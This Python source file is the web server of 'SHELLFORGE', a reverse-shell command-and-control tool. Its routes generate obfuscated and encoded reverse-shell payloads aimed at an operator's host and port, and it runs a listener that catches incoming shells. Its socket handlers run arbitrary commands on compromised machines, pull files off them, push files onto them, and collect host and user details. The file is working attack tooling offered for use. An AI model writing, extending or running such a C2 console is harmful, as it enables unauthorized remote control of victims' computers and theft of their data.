# SHELLFORGE — Copyright (C) 2025 DEDSEC <https://github.com/Unknownx007>
# SPDX-License-Identifier: AGPL-3.0-or-later
import os
import threading
from flask import Flask, render_template, request, jsonify
from flask_socketio import SocketIO, emit

from .listener import Listener
from .payloads import list_payloads, build, get_payload
from .encoders import encode as encode_payload, decode_wrapper
from .obfuscate import apply as obfuscate_apply

app = Flask(__name__, static_folder="../static", template_folder="../templates")
app.config["SECRET_KEY"] = os.urandom(32).hex()
socketio = SocketIO(app, cors_allowed_origins="*", async_mode="threading")


class AppState:
    def __init__(self):
        self.listener = None

    def start_listener(self, host, port, key):
        # stop existing (this emits session_gone for each)
        self.stop_listener()
        self.listener = Listener(host, port, key=key,
                                 on_new=self._on_new, on_gone=self._on_gone)
        self.listener.start()
        return self.listener.port

    def _on_new(self, sess):
        socketio.emit("session_new", {
            "id": sess.id, "os": sess.info.get("os", "?"),
            "host": sess.info.get("host", "?"),
            "user": sess.info.get("user", "?"),
            "cwd": sess.info.get("cwd", "?"),
            "platform": sess.info.get("platform", "?"),
        })

    def _on_gone(self, sess):
        socketio.emit("session_gone", {"id": sess.id})

    def stop_listener(self):
        """Stop listener AND emit session_gone for every active session."""
        lst = self.listener
        self.listener = None
        if not lst:
            return
        # snapshot BEFORE closing — we need the IDs to emit events
        sessions = list(lst.snapshot())
        lst.stop()
        for s in sessions:
            try:
                socketio.emit("session_gone", {"id": s.id})
            except Exception:
                pass

    def get_session(self, session_id):
        lst = self.listener
        if not lst:
            return None
        return lst.get(session_id)


state = AppState()


# ═══════════════════════ HTTP ROUTES ═══════════════════════

@app.route("/")
def index():
    return render_template("index.html")


@app.route("/api/health")
def api_health():
    try:
        return jsonify({"ok": True, "payloads": len(list_payloads())})
    except Exception as e:
        return jsonify({"ok": False, "error": str(e)}), 500


@app.route("/api/payloads")
def api_payloads():
    try:
        return jsonify({"ok": True, "payloads": list_payloads()})
    except Exception as e:
        return jsonify({"ok": False, "error": str(e)}), 500


@app.route("/api/payloads/<payload_id>/build", methods=["POST"])
def api_build_payload(payload_id):
    data = request.json or {}
    p = get_payload(payload_id)
    if not p:
        return jsonify({"ok": False, "error": "unknown payload"}), 404
    try:
        raw = build(
            payload_id,
            data.get("lhost", "127.0.0.1"),
            int(data.get("lport", 4444)),
            key=data.get("key") or None,
        )
        if data.get("obfuscate", "none") != "none":
            raw = obfuscate_apply(raw, data.get("obfuscate"))
        chain = data.get("encode") or []
        if chain:
            encoded = encode_payload(raw, chain)
            if data.get("raw"):
                out = encoded.decode() if isinstance(encoded, bytes) else encoded
            else:
                out = decode_wrapper(encoded, chain)
        else:
            out = raw
        return jsonify({
            "ok": True,
            "payload": out,
            "filename": p.get("default_filename", "payload.txt"),
        })
    except Exception as e:
        return jsonify({"ok": False, "error": str(e)}), 400


# ═══════════════════════ SOCKET HANDLERS ═══════════════════════

@socketio.on("connect")
def on_connect():
    sessions = []
    port = None
    if state.listener:
        port = state.listener.port
        sessions = [{
            "id": s.id,
            "os": s.info.get("os", "?"),
            "host": s.info.get("host", "?"),
            "user": s.info.get("user", "?"),
            "cwd": s.info.get("cwd", "?"),
        } for s in state.listener.snapshot()]
    emit("sessions_init", {"sessions": sessions, "port": port})


@socketio.on("start_listener")
def on_start_listener(data):
    try:
        port = state.start_listener(
            data.get("host", "0.0.0.0"),
            int(data.get("port", 4444)),
            data.get("key") or None,
        )
        socketio.emit("listener_started", {
            "host": data.get("host", "0.0.0.0"),
            "port": port,
            "has_key": bool(data.get("key")),
        })
    except Exception as e:
        emit("error", {"msg": f"listener failed: {e}"})


@socketio.on("stop_listener")
def on_stop_listener():
    # stop_listener() emits session_gone for every session internally
    state.stop_listener()
    socketio.emit("listener_stopped", {})


@socketio.on("exec")
def on_exec(data):
    sess = state.get_session(data.get("session_id"))
    if not sess:
        emit("error", {"msg": "session not found"}); return
    cmd = data.get("cmd", "")

    def run():
        try:
            m = sess.cmd({"type": "exec", "cmd": cmd})
            if m is None:
                socketio.emit("command_output", {
                    "session_id": sess.id,
                    "stdout": "",
                    "stderr": "[session closed]",
                    "rc": -1,
                })
                return
            # NOTE: no "cmd" field — the JS already echoed it on Send.
            socketio.emit("command_output", {
                "session_id": sess.id,
                "stdout": m.get("stdout", ""),
                "stderr": m.get("stderr", ""),
                "rc": m.get("rc"),
                "cwd": m.get("cwd"),
            })
        except Exception as e:
            socketio.emit("command_output", {
                "session_id": sess.id,
                "stdout": "",
                "stderr": str(e),
                "rc": -1,
            })

    threading.Thread(target=run, daemon=True).start()


@socketio.on("info")
def on_info(data):
    sess = state.get_session(data.get("session_id"))
    if not sess:
        emit("error", {"msg": "session not found"}); return

    def run():
        try:
            m = sess.cmd({"type": "info"})
            socketio.emit("session_info",
                          {"session_id": sess.id, "info": m or {}})
        except Exception as e:
            socketio.emit("error", {"msg": str(e)})

    threading.Thread(target=run, daemon=True).start()


@socketio.on("kill_session")
def on_kill(data):
    sess = state.get_session(data.get("session_id"))
    if not sess:
        emit("error", {"msg": "session not found"}); return

    def run():
        try:
            sess.cmd({"type": "kill"})
        except Exception:
            pass
        try:
            sess.close()
        except Exception:
            pass
        lst = state.listener
        if lst:
            try:
                lst.remove(sess)
            except Exception:
                pass
        # explicit emit so UI removes it even if on_gone missed
        socketio.emit("session_gone", {"id": sess.id})

    threading.Thread(target=run, daemon=True).start()


@socketio.on("download")
def on_download(data):
    sess = state.get_session(data.get("session_id"))
    if not sess:
        emit("error", {"msg": "session not found"}); return
    path = data.get("path", "")

    def run():
        try:
            m = sess.cmd({"type": "download", "path": path})
            if m and m.get("data"):
                emit("download_ready", {
                    "session_id": sess.id, "path": path, "data": m["data"],
                })
            else:
                emit("error", {"msg": (m or {}).get("err", "download failed")})
        except Exception as e:
            emit("error", {"msg": str(e)})

    threading.Thread(target=run, daemon=True).start()


@socketio.on("upload")
def on_upload(data):
    sess = state.get_session(data.get("session_id"))
    if not sess:
        emit("error", {"msg": "session not found"}); return
    path = data.get("path", "")
    file_data = data.get("data", "")

    def run():
        try:
            m = sess.cmd({"type": "upload", "path": path, "data": file_data})
            if m and m.get("ok"):
                emit("upload_done", {
                    "session_id": sess.id, "path": path, "size": m.get("size"),
                })
            else:
                emit("error", {"msg": (m or {}).get("err", "upload failed")})
        except Exception as e:
            emit("error", {"msg": str(e)})

    threading.Thread(target=run, daemon=True).start()


def run(host="127.0.0.1", port=8080, debug=False):
    print(f"\n  ⚡ SHELLFORGE web running at http://{host}:{port}\n")
    socketio.run(app, host=host, port=port, debug=debug,
                 allow_unsafe_werkzeug=True)
